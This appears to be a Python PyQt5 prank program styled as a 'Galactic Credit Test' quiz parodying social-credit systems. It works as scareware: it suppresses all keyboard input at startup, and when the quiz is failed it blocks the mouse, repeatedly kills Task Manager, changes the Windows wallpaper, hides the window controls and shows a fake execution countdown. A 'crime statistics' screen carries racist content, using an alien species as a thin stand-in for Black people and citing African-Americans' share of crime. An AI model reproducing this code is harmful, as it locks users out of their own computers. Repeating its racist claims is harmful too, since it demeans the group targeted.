from signal import *
import sys
import time
from pygame import mixer
from PyQt5 import QtWidgets as qtw
from PyQt5 import QtGui as qtg
from PyQt5 import QtCore as qt
from PyQt5.QtCore import Qt
import PyQt5
import ctypes
import pynput
import psutil
import os

page = ""
points = 40
question = 1
mixer.init()
mouselistener = pynput.mouse.Listener(suppress=True)
keyboardlistener = pynput.keyboard.Listener(suppress=True)


def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


path = b'D:\\ULTRAKILL\\test\\se.jpg'


class WinWindow(qtw.QWidget):
    def exit(self):
        sys.exit()

    def crime(self):
        widget.setCurrentWidget(BC)
        widget.setWindowTitle("Zlaxen Crime Statistics")
        mixer.music.stop()

    def UIComponents(self):
        # Button1
        buttoncrime = qtw.QPushButton("View Zlaxen Crime Statistics", self)
        buttoncrime.setGeometry(250, 200, 140, 30)
        buttoncrime.clicked.connect(self.crime)
        buttoncrime.move(20, 320)
        buttoncrime.setStyleSheet("""
                font-size: 11px;
                """)

        # button2
        buttonexit = qtw.QPushButton("Exit", self)
        buttonexit.setGeometry(250, 200, 100, 30)
        buttonexit.clicked.connect(self.exit)
        buttonexit.move(175, 320)
        buttonexit.setStyleSheet("""
                font-size: 11px;
                """)

    def __init__(self):
        """MainWindow Constructor"""
        super().__init__()
        # main UI code goes here

        self.UIComponents()
        self.acceptDrops()
        self.setGeometry(0, 0, 300, 360)

        # change title

        # first text
        self.Firsttext = qtw.QLabel("Congratulations. you have passed citizenship!", self)
        self.Firsttext.move(10, 15)
        self.Firsttext.setStyleSheet("""
        font-size: 11px;
        """)

        # Text 2
        self.text2 = qtw.QLabel("""We are Very Proud to invite you to our confederacy 
we hope you fit in well and have a good time here
please note that just because you have passed this 
citizenship test, does not mean you cannot be 
sent of the planet for committing any crimes""", self)
        self.text2.move(20, 240)
        self.text2.setStyleSheet("""
                color: blue;
                text-decoration: underline;
                font-size: 11px;
                """)

        # text 3
        self.text3 = qtw.QLabel("Prize", self)
        self.text3.move(135, 220)
        self.text3.setStyleSheet("""
                font-size: 11px;
                """)

        # image
        self.labelimage = qtw.QLabel(self)
        self.pixmap = qtg.QPixmap(resource_path('fishy.jpg'))
        self.labelimage.setPixmap(self.pixmap)
        self.labelimage.move(10, 35)

        # end main UI code
        self.show()


class CrimeWindow(qtw.QWidget):

    def UI(self):
        buttonleave = qtw.QPushButton("Exit", self)
        buttonleave.setGeometry(250, 200, 50, 30)
        buttonleave.clicked.connect(WinWindow.exit)
        buttonleave.move(120, 320)
        buttonleave.setStyleSheet("""
                font-size: 11px;
                """)

    def __init__(self):
        super().__init__()
        # main UI code goes here
        self.acceptDrops()
        self.setGeometry(0, 0, 300, 360)
        # change title

        # text 1
        self.title = qtw.QLabel("Zlaxen Crime statistics", self)
        self.title.move(105, 10)
        self.title.setStyleSheet("""
                font-size: 11px;
                """)
        # text2
        self.text2 = qtw.QLabel("""In 2934, more than 93% of disintigratoins and non-negligent 
ship destructoin crimes were committed by Zlaxen Aliens 
compared to the 7% committed by both humans and aliens
from different solar systems. They also committed 48% of ship-jacking 
Crimes, and of people under the age of 78 solar rotations, Zlaxens 
have the highest percentage of crimes committed in nearly
every single categories. These statistics are further heightened
 by the ratio of White people in America compared to that
 of African-Americans, where they take up ony 13% of the 
 population, while committing a large portion of crimes.
""", self)
        self.text2.move(10, 30)
        self.text2.setStyleSheet("""
                font-size: 11px;
                """)

        self.UI()
        self.show()


class Title(qtw.QWidget):

    def start(self):
        widget.setCurrentWidget(q1)
        widget.setWindowTitle(f"galactic Credit: {points}")

    def chinese(self):
        mixer.music.load(resource_path('music.mp3'))
        mixer.music.play()
        widget.setCurrentWidget(m)
        widget.setWindowTitle("ᒲᔑᓭℸ ̣ ᒷ∷")

    def warn(self):
        widget.setCurrentWidget(w)
        widget.setWindowTitle("!!!WARNING!!!")

    def UI(self):
        buttonstart = qtw.QPushButton("Start", self)
        buttonstart.setGeometry(250, 200, 150, 40)
        buttonstart.clicked.connect(self.start)
        buttonstart.move(75, 202)
        buttonstart.setStyleSheet("""
                                font-size: 25px;
                                """)

        buttonᒲᔑᓭℸ = qtw.QPushButton("ᒲᔑᓭℸ ̣ ᒷ∷", self)
        buttonᒲᔑᓭℸ.setGeometry(250, 200, 150, 40)
        buttonᒲᔑᓭℸ.clicked.connect(self.chinese)
        buttonᒲᔑᓭℸ.move(75, 252)
        buttonᒲᔑᓭℸ.setStyleSheet("""
                                font-size: 23px;
                                """)

        buttonexit = qtw.QPushButton("Exit", self)
        buttonexit.setGeometry(250, 200, 150, 40)
        buttonexit.clicked.connect(self.warn)
        buttonexit.move(75, 302)
        buttonexit.setStyleSheet("""
                                font-size: 25px;
                                """)

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        self.UI()

        mixer.music.load(resource_path('Song.mp3'))
        mixer.music.play(loops=-1)
        widget.setWindowTitle("Home")

        self.title = qtw.QLabel('GALACTIC CREDIT TEST!!!', self)
        self.title.move(15, 5)
        self.title.setStyleSheet("""
                        color: red;
                        font-size: 25px;
                        """)

        self.Flag = qtw.QLabel(self)
        self.fpix = qtg.QPixmap(resource_path('flag.png'))
        self.Flag.setPixmap(self.fpix)
        self.Flag.move(50, 40)


class Man(qtw.QWidget):

    def go(self):
        mixer.music.load(resource_path('Song.mp3'))
        mixer.music.play(loops=-1)
        widget.setCurrentWidget(S)
        widget.setWindowTitle("Home")

    def UI(self):
        buttonstart = qtw.QPushButton("Return", self)
        buttonstart.setGeometry(250, 200, 45, 20)
        buttonstart.clicked.connect(self.go)
        buttonstart.move(125, 335)
        buttonstart.setStyleSheet("""
                font-size: 11px;
                """)

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        self.UI()

        mixer.music.load(resource_path('speaking.mp3'))
        mixer.music.play(loops=-1)
        widget.setWindowTitle("Home")

        self.title = qtw.QLabel('ᒲᔑᓭℸ ̣ ᒷ∷', self)
        self.title.move(120, 1)
        self.title.setStyleSheet("""
                font-size: 11px;
                """)

        self.body = qtw.QLabel("""⍑ᒷꖎꖎ𝙹, ╎ ᔑᒲ ℸ ̣ ⍑ᒷ ᒲᔑᓭℸ ̣ ᒷ∷ 𝙹⎓ ℸ ̣ ⍑ᒷ ⊣ᔑꖎᔑᓵℸ ̣ ╎ᓵ ⎓ᒷ↸ᒷ∷ᔑℸ ̣ 
        ╎𝙹リ ᔑリ↸ ╎ ᔑᒲ ∴ᒷꖎᓵ𝙹ᒲ╎リ⊣ ||𝙹⚍ ℸ ̣ 𝙹 ℸ ̣ ⍑ᒷ ⎓ᒷ↸ᒷ∷ᔑℸ ̣ 
        ╎𝙹リ. !¡ꖎᒷᔑᓭᒷ ᓭℸ ̣ ᔑ|| ∷ᒷᓭ!¡ᒷᓵℸ ̣ ⎓⚍ꖎ""", self)
        self.body.move(10, 270)
        self.body.setStyleSheet("""
                font-size: 11px;
                """)

        self.ma = qtw.QLabel(self)
        self.mapix = qtg.QPixmap(resource_path('galactic master.png'))
        self.ma.setPixmap(self.mapix)
        self.ma.move(5, 15)


class Warning(qtw.QWidget):
    def UI(self):
        buttonstart = qtw.QPushButton("Start", self)
        buttonstart.setGeometry(250, 200, 150, 50)
        buttonstart.clicked.connect(Title.start)
        buttonstart.move(75, 300)
        buttonstart.setStyleSheet("""
                                font-size: 25px;
                                """)

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        self.UI()

        self.title = qtw.QLabel('!!WARNING!!', self)
        self.title.move(75, 5)
        self.title.setStyleSheet("""
                                color: red;
                                font-size: 25px;
                                """)

        self.body = qtw.QLabel('''ATTENTION CITIZEN! This quiz is 
mandatory for all chinese citizens! failure to 
complete test can lead to up to 10 years in 
a re-education camp!!''', self)
        self.body.move(10, 40)
        self.body.setStyleSheet("""
                                        font-size: 15px;
                                        """)

        self.body2 = qtw.QLabel('''ᔑℸ ̣ ℸ ̣ ᒷリℸ ̣ ╎𝙹リ ᓵ╎ℸ ̣ ╎⨅ᒷリ! ℸ ̣ ⍑╎ᓭ ᑑ⚍╎⨅ ╎ᓭ 
ᒲᔑリ↸ᔑℸ ̣ 𝙹∷|| ⎓𝙹∷ ᔑꖎꖎ ᓵ⍑╎リᒷᓭᒷ ᓵ╎ℸ ̣ ╎⨅ᒷリᓭ! ⎓ᔑ╎ꖎ⚍∷ᒷ ℸ ̣ 𝙹 
ᓵ𝙹ᒲ!¡ꖎᒷℸ ̣ ᒷ ℸ ̣ ᒷᓭℸ ̣  ᓵᔑリ ꖎᒷᔑ↸ ℸ ̣ 𝙹 ⚍!¡ ℸ ̣ 𝙹 ℸ ̣ ᒷリ ||ᒷᔑ∷ᓭ ╎リ 
ᔑ ∷ᒷ-ᒷ↸⚍ᓵᔑℸ ̣ ╎𝙹リ ᓵᔑᒲ!¡!!''', self)
        self.body2.move(10, 200)
        self.body2.setStyleSheet("""
                                        font-size: 15px;
                                        """)


def incorrect():
    global points
    global question
    question += 1
    print(question)
    points = points - 200
    a = mixer.Sound(resource_path('wrong.mp3'))
    mixer.Sound.play(a)
    widget.setCurrentWidget(wr)
    widget.setWindowTitle(f"galactic Credit: {points}")


def glory():
    global points
    global question
    question += 1
    print(question)
    points += 50
    a = mixer.Sound(resource_path('right.mp3'))
    mixer.Sound.play(a)
    widget.setCurrentWidget(r)
    widget.setWindowTitle(f"galactic Credit: {points}")


def correct():
    global points
    global question
    question += 1
    print(question)
    points += 100
    a = mixer.Sound(resource_path('right.mp3'))
    mixer.Sound.play(a)
    widget.setCurrentWidget(r)
    widget.setWindowTitle(f"galactic Credit: {points}")


def nextq():
    if question == 2:
        widget.setCurrentWidget(q2)
        widget.setWindowTitle(f"galactic credits: {points}")
    elif question == 3:
        widget.setCurrentWidget(q3)
        widget.setWindowTitle(f"galactic credits: {points}")
    elif question == 4:
        widget.setCurrentWidget(q4)
        widget.setWindowTitle(f"galactic credits: {points}")
    elif question == 5:
        widget.setCurrentWidget(q5)
        widget.setWindowTitle(f"galactic credits: {points}")
    else:
        if points > 0:
            mixer.music.load(resource_path('winsong.mp3'))
            mixer.music.play(loops=-1)
            widget.setCurrentWidget(ww)
            widget.setWindowTitle('CONGRATULATIONS!!!!')
        else:
            mixer.music.load(resource_path('lose song.mp3'))
            mixer.music.play(loops=-1)
            widget.setCurrentWidget(f)
            widget.setWindowTitle("!!!!!FAILURE FAILURE FAILURE FAILURE!!!!")
            timer.start(1000)
            mouselistener.start()
            ctypes.windll.user32.SystemParametersInfoA(20, 0, path, 3)


class Q1(qtw.QWidget):

    def UI(self):
        button1 = qtw.QPushButton("1. Yes, all the planets are apart", self)
        button1.setGeometry(250, 200, 250, 30)
        button1.clicked.connect(incorrect)
        button1.move(25, 240)
        button1.setStyleSheet("""
                                font-size: 12px;
                                """)

        button2 = qtw.QPushButton("2. No, not after all the crimes they committed in 2445", self)
        button2.setGeometry(250, 200, 250, 30)
        button2.clicked.connect(correct)
        button2.move(25, 270)
        button2.setStyleSheet("""
                                font-size: 11px;
                                """)

        button3 = qtw.QPushButton("3. no", self)
        button3.setGeometry(250, 200, 250, 30)
        button3.clicked.connect(glory)
        button3.move(25, 300)
        button3.setStyleSheet("""
                                font-size: 12px;
                                """)

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        self.UI()

        self.title = qtw.QLabel('is the planet of Zlaxen apart of the galactic federation', self)
        self.title.move(5, 5)
        self.title.setStyleSheet("""
        font-size: 15px;
        """)

        self.a = qtw.QLabel(self)
        self.apix = qtg.QPixmap(resource_path('tf.png'))
        self.a.setPixmap(self.apix)
        self.a.move(5, 25)


class Q2(qtw.QWidget):

    def UI(self):
        button1 = qtw.QPushButton("1. do nothing", self)
        button1.setGeometry(250, 200, 250, 30)
        button1.clicked.connect(glory)
        button1.move(25, 240)
        button1.setStyleSheet("""
                                font-size: 12px;
                                """)

        button2 = qtw.QPushButton("2. flail around and start breathing heavily", self)
        button2.setGeometry(250, 200, 250, 30)
        button2.clicked.connect(incorrect)
        button2.move(25, 270)
        button2.setStyleSheet("""
                                font-size: 10px;
                                """)

        button3 = qtw.QPushButton("3. make sure you have enough oxygen to last before a rescue squad is dispatched", self)
        button3.setGeometry(250, 200, 250, 30)
        button3.clicked.connect(correct)
        button3.move(25, 300)
        button3.setStyleSheet("""
                                font-size: 12px;
                                """)

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        self.UI()

        self.title = qtw.QLabel('what should you do if you get caught in the vacuum of space', self)
        self.title.move(5, 5)
        self.title.setStyleSheet("""
        font-size: 15px;
        """)

        self.a = qtw.QLabel(self)
        self.apix = qtg.QPixmap(resource_path('nothing.png'))
        self.a.setPixmap(self.apix)
        self.a.move(5, 25)


class Q3(qtw.QWidget):
    def UI(self):
        button1 = qtw.QPushButton("1. Yes, and you can even keep them as pets!", self)
        button1.setGeometry(250, 200, 250, 30)
        button1.clicked.connect(incorrect)
        button1.move(25, 240)
        button1.setStyleSheet("""
                                    font-size: 9px;
                                    """)

        button2 = qtw.QPushButton("2. No they are not allowed", self)
        button2.setGeometry(250, 200, 250, 30)
        button2.clicked.connect(glory)
        button2.move(25, 270)
        button2.setStyleSheet("""
                                    font-size: 12px;
                                    """)

        button3 = qtw.QPushButton("3. No, as they may impact the environment and throw off the balance of the planet", self)
        button3.setGeometry(250, 200, 250, 30)
        button3.clicked.connect(correct)
        button3.move(25, 300)
        button3.setStyleSheet("""
                                    font-size: 9px;
                                    """)

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        self.UI()

        self.title = qtw.QLabel('is the import of foreign fauna to other planets legal?', self)
        self.title.move(5, 5)
        self.title.setStyleSheet("""
            font-size: 10px;
            """)

        self.a = qtw.QLabel(self)
        self.apix = qtg.QPixmap(resource_path('bear.png'))
        self.a.setPixmap(self.apix)
        self.a.move(5, 25)


class Q4(qtw.QWidget):
    def UI(self):
        button1 = qtw.QPushButton("1. No, and you should report any offenders to the galactic police", self)
        button1.setGeometry(250, 200, 250, 30)
        button1.clicked.connect(correct)
        button1.move(25, 240)
        button1.setStyleSheet("""
                               font-size: 9px;
             """)

        button2 = qtw.QPushButton("2. No", self)
        button2.setGeometry(250, 200, 250, 30)
        button2.clicked.connect(glory)
        button2.move(25, 270)
        button2.setStyleSheet("""
                                    font-size: 11px;
                                    """)

        button3 = qtw.QPushButton("3. Yes, feel free to give them a free ride to anywhere!", self)
        button3.setGeometry(250, 200, 250, 30)
        button3.clicked.connect(incorrect)
        button3.move(25, 300)
        button3.setStyleSheet("""
                                    font-size: 10px;
                                    """)

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        self.UI()

        self.title = qtw.QLabel('is attempting to help a fugitive legal in the GGF?', self)
        self.title.move(5, 5)
        self.title.setStyleSheet("""
        font-size: 15px;
        """)

        self.a = qtw.QLabel(self)
        self.apix = qtg.QPixmap(resource_path('jail.png'))
        self.a.setPixmap(self.apix)
        self.a.move(5, 25)


class Q5(qtw.QWidget):
    def UI(self):
        button1 = qtw.QPushButton("1. I have no clue", self)
        button1.setGeometry(250, 200, 250, 30)
        button1.clicked.connect(glory)
        button1.move(25, 240)
        button1.setStyleSheet("""
                                    font-size: 12px;
                                    """)

        button2 = qtw.QPushButton("2. 1/2 * [g(x)]^2", self)
        button2.setGeometry(250, 200, 250, 30)
        button2.clicked.connect(correct)
        button2.move(25, 270)
        button2.setStyleSheet("""
                                    font-size: 11px;
                                    """)

        button3 = qtw.QPushButton("3. 1/2 * [g′(x)]^2", self)
        button3.setGeometry(250, 200, 250, 30)
        button3.clicked.connect(incorrect)
        button3.move(25, 300)
        button3.setStyleSheet("""
                                    font-size: 12px;
                                    """)

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        self.UI()

        self.title = qtw.QLabel('Solve this simple maths Equation', self)
        self.title.move(5, 5)
        self.title.setStyleSheet("""
            font-size: 15px;
            """)

        self.a = qtw.QLabel(self)
        self.apix = qtg.QPixmap(resource_path('simple.png'))
        self.a.setPixmap(self.apix)
        self.a.move(5, 25)


class right(qtw.QWidget):
    question += 1
    print(question)

    def UI(self):
        button3 = qtw.QPushButton("Next Question", self)
        button3.setGeometry(250, 200, 200, 30)
        button3.clicked.connect(nextq)
        button3.move(50, 300)
        button3.setStyleSheet("""
                                font-size: 12px;
                                """)

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        self.UI()

        self.title = qtw.QLabel('QUESTION RIGHT!!!', self)
        self.title.move(70, 5)
        self.title.setStyleSheet("""
        font-size: 20px;
        color: red;
        """)

        self.body = qtw.QLabel('Good job on right answer! Points Increased!', self)
        self.body.move(10, 240)
        self.body.setStyleSheet("""
                font-size: 11px;
                """)

        self.a = qtw.QLabel(self)
        self.apix = qtg.QPixmap(resource_path('happy.png'))
        self.a.setPixmap(self.apix)
        self.a.move(5, 40)


class wrong(qtw.QWidget):
    question += 1
    print(question)

    def UI(self):
        button3 = qtw.QPushButton("Next Question", self)
        button3.setGeometry(250, 200, 200, 30)
        button3.clicked.connect(nextq)
        button3.move(50, 300)
        button3.setStyleSheet("""
                                   font-size: 12px;
                                   """)

    def __init__(self):
        super().__init__()

        self.acceptDrops()
        self.UI()

        self.title = qtw.QLabel('QUESTION WRONG!!!', self)
        self.title.move(70, 5)
        self.title.setStyleSheet("""
           font-size: 20px;
           color: red;
           """)

        self.body = qtw.QLabel('''                  Watch out!, If you score to low 
                            you will be punished!''', self)
        self.body.move(10, 240)
        self.body.setStyleSheet("""
                font-size: 11px;
                """)

        self.a = qtw.QLabel(self)
        self.apix = qtg.QPixmap(resource_path('sad.png'))
        self.a.setPixmap(self.apix)
        self.a.move(5, 40)


class failed(qtw.QWidget):

    def timerEvent(self):
        global time
        time = time.addSecs(-1)
        print(time.toString("hh:mm:ss"))
        self.count.setText("Time until Excecution: " + time.toString("hh:mm:ss"))

        for process in (process for process in psutil.process_iter() if process.name() == "Taskmgr.exe"):
            process.kill()

    def __init__(self):
        super().__init__()
        self.acceptDrops()
        timer.timeout.connect(self.timerEvent)

        self.title = qtw.QLabel('FAILURE', self)
        self.title.move(70, 5)
        self.title.setStyleSheet("""
           font-size: 20px;
           color: red;
           """)
        self.body = qtw.QLabel('''ATTENTION CITIZEN:
You Have failed the Galactic citizenship test (GCT). A
Highly trained galactic hit forced has been dispatched to
you location. do not try and resist.''', self)
        self.body.move(10, 240)
        self.body.setStyleSheet("""
                font-size: 11px;
                """)

        self.count = qtw.QLabel("Time until Ecxceution: " + time.toString("hh:mm:ss"), self)
        self.count.move(70, 320)
        self.count.setStyleSheet("""
                font-size: 11px;
                """)

        self.a = qtw.QLabel(self)
        self.apix = qtg.QPixmap(resource_path('alienpresident.png'))
        self.a.setPixmap(self.apix)
        self.a.move(5, 40)


if __name__ == '__main__':
    # load music
    mixer.init()
    mixer.music.load(resource_path('Song.mp3'))
    mixer.music.set_volume(10000)
    keyboardlistener.start()

    # start app
    app = qtw.QApplication(sys.argv)
    widget = qtw.QStackedWidget()

    # timer shit
    timer = qt.QTimer()
    time = qt.QTime(4, 50, 50)

    # initialize each page
    ww = WinWindow()
    widget.addWidget(ww)
    BC = CrimeWindow()
    widget.addWidget(BC)
    S = Title()
    widget.addWidget(S)
    m = Man()
    widget.addWidget(m)
    w = Warning()
    widget.addWidget(w)
    r = right()
    widget.addWidget(r)
    wr = wrong()
    widget.addWidget(wr)
    q1 = Q1()
    widget.addWidget(q1)
    q2 = Q2()
    widget.addWidget(q2)
    q3 = Q3()
    widget.addWidget(q3)
    q4 = Q4()
    widget.addWidget(q4)
    q5 = Q5()
    widget.addWidget(q5)
    f = failed()
    widget.addWidget(f)

    # setup environment
    widget.setWindowFlags(widget.windowFlags() | qt.Qt.CustomizeWindowHint)
    widget.setWindowFlags(widget.windowFlags() & ~qt.Qt.WindowCloseButtonHint)
    widget.setWindowFlags(widget.windowFlags() & ~qt.Qt.WindowMaximizeButtonHint)
    widget.setWindowFlags(widget.windowFlags() & ~qt.Qt.WindowMinimizeButtonHint)
    widget.setWindowIcon(qtg.QIcon(resource_path('icon.png')))
    widget.setFixedWidth(300)
    widget.setFixedHeight(360)
    widget.setCurrentWidget(S)
    widget.show()

    # play music
    mixer.music.load(resource_path('Song.mp3'))
    mixer.music.play(loops=-1)

    # start appS
    sys.exit(app.exec())
